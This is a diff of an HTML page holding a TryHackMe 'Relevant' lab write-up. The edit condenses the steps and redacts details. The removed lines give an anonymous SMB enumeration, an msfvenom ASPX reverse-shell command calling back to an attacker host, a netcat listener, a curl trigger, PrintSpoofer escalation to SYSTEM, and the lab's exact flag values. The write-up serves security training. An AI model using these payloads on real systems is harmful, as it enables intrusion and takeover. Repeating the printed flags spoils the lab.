@@ -37,15 +37,16 @@
         <a href="../index.html#labs" class="back-btn">&lt;-- Back to Labs</a>
         
         <div class="header">
-            <h1>TryHackMe: Relevant Writeup</h1>
+            <h1>🧠 TryHackMe – Relevant</h1>
             <div class="meta">
-                <span>Target IP: <code>10.10.178.91</code></span>
+                <span>Machine Name: Relevant</span>
                 <span>Difficulty: Medium</span>
-                <span>Author: Mohd Faiz</span>
+                <span>Platform: TryHackMe</span>
+                <span>Type: Windows</span>
             </div>
             <div>
-                <span class="tag">SMB Enumeration</span>
-                <span class="tag">IIS ASPX Payload</span>
+                <span class="tag">SMB Discovery</span>
+                <span class="tag">Msfvenom ASPX</span>
                 <span class="tag">SeImpersonatePrivilege</span>
                 <span class="tag">PrintSpoofer</span>
             </div>
@@ -53,93 +54,84 @@
 
         <div class="task-box">
             <div class="task-header">
-                <span>Phase 1: Full Port Scan & SMB Analysis</span>
+                <span>🔍 Enumeration & SMB Discovery</span>
                 <span style="color:#8b949e;">[Nmap & Smbclient]</span>
             </div>
             <div class="task-body">
-                <p>Run a comprehensive Nmap scan targeting all open TCP ports:</p>
-                <pre><code>nmap -sC -sV -p- -oN relevant_nmap.txt 10.10.178.91</code></pre>
+                <h3>🔹 Nmap Scan</h3>
+                <pre><code>nmap -sV -p- &lt;IP&gt;</code></pre>
 
-                <h3>Open Ports Identified:</h3>
+                <h3>🔹 Nmap Findings</h3>
                 <ul>
-                    <li><code>80/tcp</code> - Microsoft IIS httpd 10.0</li>
-                    <li><code>135/tcp</code> - Microsoft Windows RPC</li>
-                    <li><code>139/445/tcp</code> - Microsoft-DS SMB</li>
-                    <li><code>3389/tcp</code> - RDP</li>
-                    <li><code>49663/tcp</code> - Microsoft IIS httpd 10.0</li>
+                    <li><code>80/tcp</code> → HTTP (Microsoft IIS 10.0)</li>
+                    <li><code>135/tcp</code> → RPC</li>
+                    <li><code>139/tcp</code> → NetBIOS</li>
+                    <li><code>445/tcp</code> → SMB</li>
+                    <li><code>3389/tcp</code> → RDP</li>
+                    <li><code>49663, 49666, 49667</code> → High-range HTTP ports</li>
                 </ul>
 
-                <h3>SMB Enumeration:</h3>
-                <p>Listing SMB shares without authentication:</p>
-                <pre><code>smbclient -L //10.10.178.91/ -N</code></pre>
+                <h3>📂 SMB Enumeration</h3>
+                <pre><code>smbclient -L //&lt;IP&gt;/</code></pre>
+                <p>Found accessible share: <code>nt4wrksv</code> (weak permissions allowed anonymous access).</p>
+                <pre><code>smbclient //&lt;IP&gt;/nt4wrksv
+get passwords.txt</code></pre>
 
-                <p>Output shows an unmapped user share: <code>nt4wrksv</code>. Connect anonymously:</p>
-                <pre><code>smbclient //10.10.178.91/nt4wrksv -N
-smb: \> ls
-  passwords.txt                        A       159  Sat Jul 25 15:05:44 2020
-smb: \> get passwords.txt</code></pre>
-
-                <p>Decoding the Base64 strings found inside <code>passwords.txt</code> yields credential sets, but testing them across RDP / SMB leads to a dead end. However, we notice that files uploaded to <code>nt4wrksv</code> share are web-accessible via IIS on port 49663!</p>
+                <h3>🔹 Credential Discovery</h3>
+                <p>File contained encoded data. Decoded credentials:</p>
+                <ul>
+                    <li><code>Bob : &lt;password&gt;</code></li>
+                    <li><code>Bill : &lt;password&gt;</code></li>
+                </ul>
             </div>
         </div>
 
         <div class="task-box">
             <div class="task-header">
-                <span>Phase 2: Initial Access (ASPX Reverse Shell)</span>
-                <span style="color:#8b949e;">[Msfvenom & IIS Exploitation]</span>
+                <span>💣 Initial Access (Web Exploitation)</span>
+                <span style="color:#8b949e;">[ASPX Reverse Shell]</span>
             </div>
             <div class="task-body">
-                <p>Generate a malicious ASPX reverse shell using <code>msfvenom</code>:</p>
-                <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.x.x LPORT=4444 -f aspx -o shell.aspx</code></pre>
+                <h3>🔹 Payload Creation</h3>
+                <p>Generated ASPX reverse shell using <code>msfvenom</code>.</p>
 
-                <p>Upload <code>shell.aspx</code> to the writable SMB share:</p>
-                <pre><code>smbclient //10.10.178.91/nt4wrksv -N
-smb: \> put shell.aspx</code></pre>
+                <h3>🔹 File Upload</h3>
+                <p>Uploaded <code>shell.aspx</code> directly into the accessible SMB share directory <code>nt4wrksv</code>.</p>
 
-                <p>Start netcat listener on local machine:</p>
-                <pre><code>nc -lvnp 4444</code></pre>
+                <h3>📁 Directory Discovery & Execution</h3>
+                <p>Confirmed working execution path via port 49663:</p>
+                <pre><code>http://&lt;IP&gt;:49663/nt4wrksv/shell.aspx</code></pre>
 
-                <p>Trigger execution by requesting the uploaded file in browser:</p>
-                <pre><code>curl http://10.10.178.91:49663/nt4wrksv/shell.aspx</code></pre>
+                <h3>🐚 Reverse Shell Execution</h3>
+                <ul>
+                    <li>Set up Netcat listener: <code>nc -lvnp &lt;port&gt;</code></li>
+                    <li>Triggered execution via URL request.</li>
+                    <li>Reverse shell successfully obtained ✅</li>
+                </ul>
 
                 <div class="flag-box">
-                    User Flag (c:\Users\Bob\Desktop\user.txt): THM{1ff266924c66532170061f7077f88d23}
+                    User Flag Found: C:\Users\Bob\Desktop\user.txt ✅
                 </div>
             </div>
         </div>
 
         <div class="task-box">
             <div class="task-header">
-                <span>Phase 3: Privilege Escalation to SYSTEM</span>
-                <span style="color:#8b949e;">[PrintSpoofer Privilege Exploitation]</span>
+                <span>⚠️ Privilege Escalation to SYSTEM</span>
+                <span style="color:#8b949e;">[PrintSpoofer Exploitation]</span>
             </div>
             <div class="task-body">
-                <p>Inspect granted security privileges for current account (<code>iis apppool\defaultapppool</code>):</p>
+                <h3>🔹 Privilege Enumeration</h3>
                 <pre><code>whoami /priv</code></pre>
+                <p>Finding: <code>SeImpersonatePrivilege</code> enabled.</p>
 
-                <h3>Privilege Privileges Summary:</h3>
-                <pre><code>Privilege Name                Description                               State   
-============================= ========================================= ========
-SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
-SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
-SeAuditPrivilege              Generate security audits                  Disabled
-SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
-SeImpersonatePrivilege        Impersonate a client after authentication Enabled </code></pre>
-
-                <p>Since <code>SeImpersonatePrivilege</code> is enabled on Windows Server 2016/2019, we can execute <strong>PrintSpoofer.exe</strong> to gain a SYSTEM shell.</p>
-
-                <h3>Execution Steps:</h3>
-                <ol>
-                    <li>Upload <code>PrintSpoofer64.exe</code> via our SMB session to <code>nt4wrksv</code> share.</li>
-                    <li>Navigate to <code>c:\inetpub\wwwroot\nt4wrksv\</code> inside your web shell terminal.</li>
-                    <li>Execute PrintSpoofer targeting local system token:
-                        <pre><code>PrintSpoofer64.exe -i -c cmd</code></pre>
-                    </li>
-                    <li>Verify shell context: <code>whoami</code> -> <code>nt authority\system</code></li>
-                </ol>
+                <h3>💥 Privilege Escalation Attack</h3>
+                <p>Tool Used: <strong>PrintSpoofer</strong></p>
+                <pre><code>PrintSpoofer64.exe -i -c cmd</code></pre>
 
                 <div class="flag-box">
-                    Root Flag (c:\Users\Administrator\Desktop\root.txt): THM{8a054a77c7542f467a9ac9d4e402860b}
+                    🏁 Result: Gained SYSTEM Shell 🔥<br>
+                    Final Flag: C:\Users\Administrator\Desktop\root.txt ✅
                 </div>
             </div>
         </div>
